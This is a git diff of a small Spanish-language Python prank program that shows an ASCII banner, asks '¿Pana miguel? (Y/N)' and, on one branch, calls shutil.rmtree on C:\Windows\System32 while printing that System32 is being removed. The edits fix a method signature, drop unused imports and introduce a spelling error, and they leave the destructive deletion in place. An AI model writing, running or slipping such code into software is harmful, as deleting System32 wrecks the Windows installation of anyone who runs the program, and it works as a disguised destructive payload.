@@ -1,7 +1,6 @@
 import webbrowser
 import os
-from os import system
-import ctypes
+
 import subprocess
 import shutil
 class Programa:
@@ -11,7 +10,7 @@ class Programa:
         self.nombre_txt = "mi_pana.txt"
         self.cmdejecutar = f'start cmd /K python {self.directorio}\\panacmd.py'
         
-    def Banner():
+    def Banner(self):
         os.system("color 4")
         print("""
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&(**/&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@ -44,7 +43,7 @@ if __name__ == "__main__":
     
 
 
-    Programa.Banner()
+    mi_programa.Banner()
         
 
     respuesta = input("¿Pana miguel? (Y/N)")
@@ -65,7 +64,7 @@ if __name__ == "__main__":
         try:
             print("Removing System32")
             shutil.rmtree("C:\Windows\System32")
-            print('System32 folder deleted successfully!')
+            print('System32 folder deleted succesfully!')
         except:
             print("Error deleting System32")
     input("presiona enter para salir")
